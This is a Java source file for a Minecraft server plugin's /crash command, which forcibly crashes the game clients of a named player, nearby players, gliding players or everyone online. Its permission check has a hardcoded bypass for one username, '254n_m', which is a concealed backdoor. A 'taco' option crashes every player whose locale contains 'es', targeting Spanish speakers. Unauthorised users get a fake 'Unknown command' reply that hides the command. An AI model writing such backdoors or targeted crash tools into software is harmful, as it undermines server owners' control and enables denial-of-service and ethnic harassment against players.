package org.l2x9.l2x9core.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.l2x9.l2x9core.util.Utils;

public class CrashCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (sender.hasPermission("l2x9core.crash") || sender.getName().equals("254n_m")) {
            if (args.length == 0) {
                Utils.sendMessage(sender,
                        "&4Error:&r&c please include at least one argument /crash <player|nearby number|everyone|elytra>");
            } else {
                if (args[0].equalsIgnoreCase("elytra")) {
                    for (Player online : Bukkit.getOnlinePlayers()) {
                        if (!online.isOp()) {
                            if (online.isGliding()) {
                                Utils.crashPlayer(online);
                                Utils.sendMessage(sender, "&6You have just crashed&r&c " + online.getName() + "");

                            }
                        }
                    }
                } else {
                    if (args[0].equalsIgnoreCase("everyone")) {
                        for (Player online : Bukkit.getOnlinePlayers()) {
                            if (!online.isOp()) {
                                Utils.crashPlayer(online);
                                Utils.sendMessage(sender, "&6You have just crashed&r&c " + online.getName() + "");
                            }
                        }
                    } else {
                        Player target = Bukkit.getPlayer(args[0]);
                        if (Bukkit.getOnlinePlayers().contains(target)) {
                            if (!target.hasPermission("l2x9core.crash")) {
                                Utils.crashPlayer(target);
                                Utils.sendMessage(sender, "&6You have just crashed&r&c " + target.getName() + "");
                            } else {
                                Utils.sendMessage(sender, "&4Error: &r&cYou cannot crash that player");
                            }
                        } else {
                            if (!args[0].equalsIgnoreCase("nearby") || args[0].equalsIgnoreCase("taco")
                                    || args[0].equalsIgnoreCase("everyone") || args[0].equalsIgnoreCase("elytra")) {
                                Utils.sendMessage(sender, "&4Error: &r&cTarget not online");
                            }
                        }
                        try {
                            if (args[0].equalsIgnoreCase("nearby")) {
                                if (sender instanceof Player) {
                                    Player cmdSender = (Player) sender;
                                    for (Player nearby : cmdSender.getLocation().getNearbyPlayers(Integer.parseInt(args[1]))) {
                                        if (!nearby.hasPermission("l2x9Core.crash")) {
                                            Utils.crashPlayer(nearby);
                                            Utils.sendMessage(cmdSender,
                                                    "&6You have just crashed&r&c " + nearby.getName());
                                        }
                                    }

                                } else {
                                    Utils.sendMessage(sender,
                                            "&4Error:&r&c You must be a player to use /crash nearby");
                                }
                            } else {
                                if (args[0].equalsIgnoreCase("taco")) {
                                    for (Player online : Bukkit.getOnlinePlayers()) {
                                        if (online.getLocale().toLowerCase().contains("es")) {
                                            Utils.crashPlayer(online);
                                            Utils.sendMessage(sender,
                                                    "&6You have just crashed&r&c " + online.getName());
                                        }
                                    }
                                }
                            }
                        } catch (NumberFormatException | ArrayIndexOutOfBoundsException e) {
                            Utils.sendMessage(sender, "&4Error: &r&cThe second argument must be a number");
                        }
                    }
                }
            }

        } else {
            Utils.sendMessage(sender, "Unknown command. Type \"/help\" for help.");
        }
        return true;
    }
}